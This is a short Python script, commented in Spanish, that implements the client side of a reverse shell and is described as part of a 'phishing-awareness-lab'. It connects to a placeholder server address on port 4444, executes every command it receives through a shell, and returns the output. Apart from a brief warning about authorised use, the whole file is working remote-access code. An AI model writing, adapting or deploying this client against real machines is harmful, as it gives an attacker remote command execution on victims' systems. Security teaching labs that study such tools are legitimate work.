#!/usr/bin/env python3
"""
cliente.py — Lado cliente de una reverse shell (USO EDUCATIVO).

Parte de "phishing-awareness-lab". Se conecta al servidor de laboratorio,
recibe comandos y devuelve su salida. Ejecutar SOLO en equipos propios y
entornos aislados, con autorizacion. Usarlo contra terceros es ilegal.

Define TARGET_IP con la IP de tu servidor de lab. No se incluyen IPs reales.
"""
import socket
import subprocess

TARGET_IP = "TARGET_IP"   # IP del servidor de laboratorio (reemplazar)
PORT = 4444


def main():
    print("[*] Conectando al servidor de laboratorio...")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((TARGET_IP, PORT))
    except OSError:
        print("[-] Error: el servidor no esta encendido o el firewall lo bloqueo.")
        return

    print("[+] Conexion exitosa. Esperando comandos...")
    try:
        while True:
            cmd = client.recv(65535).decode(errors="replace")
            if not cmd:
                break
            try:
                output = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=30
                )
                result = output.stdout + output.stderr
            except Exception as exc:  # noqa: BLE001
                result = f"[error] {exc}"
            client.sendall((result or "[sin salida]").encode())
    finally:
        client.close()


if __name__ == "__main__":
    main()
